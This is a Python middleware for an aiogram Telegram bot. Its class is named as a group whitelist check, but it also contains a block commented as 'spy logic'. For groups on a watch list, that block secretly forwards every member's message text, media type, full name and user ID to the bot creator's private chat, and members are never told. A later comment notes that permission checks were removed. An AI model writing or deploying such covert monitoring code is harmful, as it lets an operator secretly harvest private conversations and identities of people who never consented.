from typing import Callable, Dict, Any, Awaitable
from aiogram import BaseMiddleware
from aiogram.types import Message, CallbackQuery

from whitelist import get_whitelist, log_unauthorized_chat
from config import CREATOR_ID

class WhitelistMiddleware(BaseMiddleware):
    async def __call__(
        self,
        handler: Callable[[Message | CallbackQuery, Dict[str, Any]], Awaitable[Any]],
        event: Message | CallbackQuery,
        data: Dict[str, Any]
    ) -> Any:

        chat = event.message.chat if isinstance(event, CallbackQuery) else event.chat

        # Разрешить личные сообщения с ботом (для админа и т.д.)
        if chat.type == "private":
            return await handler(event, data)

        # Логика шпионажа
        from spy import get_spy_chats
        spy_chats = await get_spy_chats()

        # Если это сообщение и группа под наблюдением
        if chat.id in spy_chats and isinstance(event, Message) and CREATOR_ID and CREATOR_ID != 0:
            bot = data.get('bot')
            if bot:
                try:
                    # Получаем текст или подпись к медиафайлу
                    text_content = event.html_text or event.caption or ""
                    # Если есть какой-то медиафайл/стикер, помечаем это
                    media_type = ""
                    if event.photo: media_type = "[Фото] "
                    elif event.video: media_type = "[Видео] "
                    elif event.sticker: media_type = "[Стикер] "
                    elif event.voice: media_type = "[Голосовое] "
                    elif event.document: media_type = "[Файл] "


                    forward_info = " [Переслано]" if event.forward_origin else ""
                    reply_info = f" [Ответ на MSG: {event.reply_to_message.message_id}]" if event.reply_to_message else ""

                    if text_content or media_type or forward_info or reply_info:
                        await bot.send_message(
                            chat_id=CREATOR_ID,
                            text=(
                                f"👁 <b>[<code>{chat.id}</code>]</b>\n"
                                f"👤 <b>{event.from_user.full_name}</b> (<code>{event.from_user.id}</code>)\n"
                                f"🆔 MSG: <code>{event.message_id}</code>{forward_info}{reply_info}\n"
                                f"💬 {media_type}{text_content}"
                            )
                        )
                except Exception as e:
                    print(f"Spy Error: {e}")

        whitelist = await get_whitelist()



        if chat.id not in whitelist:
            # Логируем попытку использования
            is_new = await log_unauthorized_chat(chat.id, chat.title or "Unknown")

            # Отправляем уведомление админу, если это новая группа, или если кто-то настойчиво пишет
            if CREATOR_ID and CREATOR_ID != 0 and is_new:
                bot = data.get('bot')
                if bot:
                    try:
                        await bot.send_message(
                            chat_id=CREATOR_ID,
                            text=(
                                f"⚠️ <b>Попытка использования в неразрешенной группе!</b>\n\n"
                                f"Название: <b>{chat.title}</b>\n"
                                f"ID группы: <code>{chat.id}</code>\n\n"
                                f"<i>Чтобы разрешить работу, введите:</i>\n"
                                f"<code>/allow {chat.id}</code>"
                            )
                        )
                    except Exception as e:
                        print(f"Ошибка мидлвари: {e}")

            return

        # Проверка прав убрана. Бот работает в группах без ограничений
        return await handler(event, data)